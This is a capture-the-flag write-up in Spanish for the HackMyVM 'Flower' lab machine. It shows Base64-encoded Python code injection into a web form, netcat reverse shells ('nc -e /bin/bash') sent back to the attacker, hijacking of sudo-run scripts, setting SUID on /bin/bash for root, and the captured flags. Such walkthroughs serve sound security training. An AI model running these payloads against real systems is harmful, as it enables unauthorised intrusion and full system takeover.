---
icon: flag
---

# Flower HackMyVM (Easy- Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-06 14:07 EDT
Nmap scan report for 192.168.5.6
Host is up (0.0025s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:FC:0C:ED (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.34 seconds
```

Veremos que hay un puerto `80` en el que se aloja una pagina web, si entramos veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (370).png" alt=""><figcaption></figcaption></figure>

Vemos como un selector de `flores`, si seleccionamos una y le damos a `Submit` veremos que nos cuenta los petalos que tiene dicha flor, vamos a capturar la peticion con `BurpSuite` a ver que vemos.

```
POST / HTTP/1.1
Host: 192.168.5.6
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://192.168.5.6
Connection: keep-alive
Referer: http://192.168.5.6/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

petals=MSsy
```

Veremos esta peticion si la capturamos, lo que estamos viendo en la parte de `petals` es un fragmento de codigo codificado en `Base64` que si lo decodificamos veremos lo siguiente:

```
1+2
```

Vemos que esta realizando una suma, por lo que esta ejecutando algo por dentro, vamos a probar a codificar algun comando del sistema y ponerlo en la peticion para enviarlo, a ver si se ejecuta.

```
POST / HTTP/1.1
Host: 192.168.5.6
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.5.6/
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://192.168.5.6
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

petals=d2hvYW1p
```

En la respuesta del servidor y en la propia pagina web, veremos lo siguiente:

```
        <h2>

        whoami petals 
        </h2>
```

Vemos que se esta mostrando directamente el codigo decodificado, por lo que algo por dentro lo esta decodificando, pero no lo esta ejecutando, por lo que vamos a probar a intentar realizar `injecciones` de comandos con `python` algunas simples.

Despues de estar un rato probando, si probamos a poner lo siguiente de forma codificada en `Base64` veremos que funciona.

```
POST / HTTP/1.1
Host: 192.168.5.6
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.5.6/
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://192.168.5.6
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

petals=ZXhlYyh3aG9hbWkp
```

Este valor `ZXhlYyh3aG9hbWkp` es igual a `exec(whoami)`, si probamos a enviarlo, en la pagina de la respuesta veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (369).png" alt=""><figcaption></figcaption></figure>

Vemos que se esta ejecutando, por lo que vamos a generar una `reverse shell` para obtener acceso al servidor.

```
POST / HTTP/1.1
Host: 192.168.5.6
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.5.6/
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://192.168.5.6
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

petals=ZXhlYygnbmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNS40IDc3NzcnKQ==
```

Este valor `ZXhlYygnbmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNS40IDc3NzcnKQ==` es igual a `exec('nc -e /bin/bash <IP> <PORT>')`

Antes de enviarlo nos pondremos a la escucha.

```shell
nc -lvnp <PORT>
```

Ahora si enviamos la peticion y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.4] from (UNKNOWN) [192.168.5.6] 56492
whoami
www-data
```

Vemos que hemos obtenido acceso mediante el usuario `www-data` por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user rose

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on flower:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on flower:
    (rose) NOPASSWD: /usr/bin/python3 /home/rose/diary/diary.py
```

Vemos que podemos ejecutar el binario `python3` respecto a la ruta absoluta del script de `diary.py` como el usuario `rose`.

Vamos a ver que permisos tiene dicha carpeta de la siguiente forma:

```shell
ls -la /home/rose/diary/
```

Info:

```
total 12
drwxrwxrwx 2 rose rose 4096 Nov 30  2020 .
drwxrwxr-x 3 rose rose 4096 Nov 30  2020 ..
-rw-r--r-- 1 rose rose  147 Nov 30  2020 diary.py
```

Vemos que tiene todos los permisos, por lo que podremos eliminar el archivo y poner lo que queramos dentro del mismo, vamos a realizarlo de la siguiente forma:

```shell
rm /home/rose/diary/diary.py
```

Tendremos que confirmarlo con una `y` y una vez eliminado vamos a meter lo siguiente:

```python
#!/bin/python3

exec("import os; os.system('nc -e /bin/bash <IP> <PORT>')")
```

Ahora lo guardamos y lo ejecutamos de la siguiente forma.

Nos vamos a poner a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora con el usuario `www-data` ejecutaremos lo siguiente:

```shell
sudo -u rose python3 /home/rose/diary/diary.py
```

Y si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7755 ...
connect to [192.168.5.4] from (UNKNOWN) [192.168.5.6] 42938
whoami
rose
```

Vemos que hemos conseguido acceso al usuario `rose` por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Vamos a leer la `flag` del usuario.

> user.txt

```
HMV{R0ses_are_R3d$}
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for rose on flower:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User rose may run the following commands on flower:
    (root) NOPASSWD: /bin/bash /home/rose/.plantbook
```

Vemos que podemos ejecutar la `bash` con la ruta absoluta de `.plantbook` por lo que vamos a investigar un poco.

Si listamos los permisos que tiene veremos lo siguiente:

```
-rwx------ 1 rose rose  120 Nov 30  2020 .plantbook
```

Vemos que podemos editarlo, por lo que al final de las lineas vamos añadir lo siguiente:

```shell
nano /home/rose/.plantbook

#Dentro del nano
............................<RESTO DEL CODIGO>...................................

echo "Permisos establecidos de forma correcta..."
chmod u+s /bin/bash
```

Lo guardamos y lo ejecutamos de la siguiente forma:

```shell
sudo bash /home/rose/.plantbook
```

Info:

```
Hello, write the name of the flower that u found
test
Nice, test submitted on : Tue May 6 14:53:17 EDT 2025
Permisos establecidos de forma correcta...
```

Con esto vemos que se ha ejecutado de forma correcta, pero vamos a comprobarlo de la siguiente forma:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

Vemos que se establecio los permisos `SUID` a la `bash` de forma correcta, por lo que haremos lo siguiente:

```shell
bash -p
```

Info:

```
bash-5.0# whoami
root
```

Y con esto ya seremos `root` por lo que leeremos la `flag` de `root`.

> root.txt

```
HMV{R0ses_are_als0_black.}
```
